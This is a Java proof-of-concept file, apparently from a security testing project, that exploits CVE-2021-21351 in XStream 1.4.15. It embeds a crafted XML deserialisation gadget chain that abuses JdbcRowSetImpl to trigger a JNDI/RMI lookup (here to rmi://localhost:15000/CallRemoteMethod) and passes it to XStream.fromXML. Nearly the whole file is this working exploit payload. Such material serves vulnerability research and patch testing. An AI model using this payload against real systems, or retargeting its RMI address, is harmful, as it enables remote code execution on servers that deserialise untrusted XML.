package com.sectrend.xstream_v1_4_15;

import com.thoughtworks.xstream.XStream;

/**
 * @author 周德鹏
 * @version 1.0
 * @date 2023/9/20 16:50
 * @describe
 */
public class XSteamPoc_CVE_2021_21351 {
    public static void main(String[] args) {

        String xml = "<sorted-set>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>ysomap</type>\n" +
                "    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>\n" +
                "      <m__DTMXRTreeFrag>\n" +
                "        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>\n" +
                "          <m__size>-10086</m__size>\n" +
                "          <m__mgrDefault>\n" +
                "            <__overrideDefaultParser>false</__overrideDefaultParser>\n" +
                "            <m__incremental>false</m__incremental>\n" +
                "            <m__source__location>false</m__source__location>\n" +
                "            <m__dtms>\n" +
                "              <null/>\n" +
                "            </m__dtms>\n" +
                "            <m__defaultHandler/>\n" +
                "          </m__mgrDefault>\n" +
                "          <m__shouldStripWS>false</m__shouldStripWS>\n" +
                "          <m__indexing>false</m__indexing>\n" +
                "          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>\n" +
                "            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\n" +
                "              <javax.sql.rowset.BaseRowSet>\n" +
                "                <default>\n" +
                "                  <concurrency>1008</concurrency>\n" +
                "                  <escapeProcessing>true</escapeProcessing>\n" +
                "                  <fetchDir>1000</fetchDir>\n" +
                "                  <fetchSize>0</fetchSize>\n" +
                "                  <isolation>2</isolation>\n" +
                "                  <maxFieldSize>0</maxFieldSize>\n" +
                "                  <maxRows>0</maxRows>\n" +
                "                  <queryTimeout>0</queryTimeout>\n" +
                "                  <readOnly>true</readOnly>\n" +
                "                  <rowSetType>1004</rowSetType>\n" +
                "                  <showDeleted>false</showDeleted>\n" +
                "                  <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>\n" +
                "                  <listeners/>\n" +
                "                  <params/>\n" +
                "                </default>\n" +
                "              </javax.sql.rowset.BaseRowSet>\n" +
                "              <com.sun.rowset.JdbcRowSetImpl>\n" +
                "                <default/>\n" +
                "              </com.sun.rowset.JdbcRowSetImpl>\n" +
                "            </fPullParserConfig>\n" +
                "            <fConfigSetInput>\n" +
                "              <class>com.sun.rowset.JdbcRowSetImpl</class>\n" +
                "              <name>setAutoCommit</name>\n" +
                "              <parameter-types>\n" +
                "                <class>boolean</class>\n" +
                "              </parameter-types>\n" +
                "            </fConfigSetInput>\n" +
                "            <fConfigParse reference='../fConfigSetInput'/>\n" +
                "            <fParseInProgress>false</fParseInProgress>\n" +
                "          </m__incrementalSAXSource>\n" +
                "          <m__walker>\n" +
                "            <nextIsRaw>false</nextIsRaw>\n" +
                "          </m__walker>\n" +
                "          <m__endDocumentOccured>false</m__endDocumentOccured>\n" +
                "          <m__idAttributes/>\n" +
                "          <m__textPendingStart>-1</m__textPendingStart>\n" +
                "          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>\n" +
                "          <m__pastFirstElement>false</m__pastFirstElement>\n" +
                "        </m__dtm>\n" +
                "        <m__dtmIdentity>1</m__dtmIdentity>\n" +
                "      </m__DTMXRTreeFrag>\n" +
                "      <m__dtmRoot>1</m__dtmRoot>\n" +
                "      <m__allowRelease>false</m__allowRelease>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>ysomap</type>\n" +
                "    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n" +
                "      <m__obj class='string'>test</m__obj>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "</sorted-set>";


        System.out.println("开始");
        XStream xstream = new XStream();
        xstream.fromXML(xml);
        System.out.println("结束");
    }
}
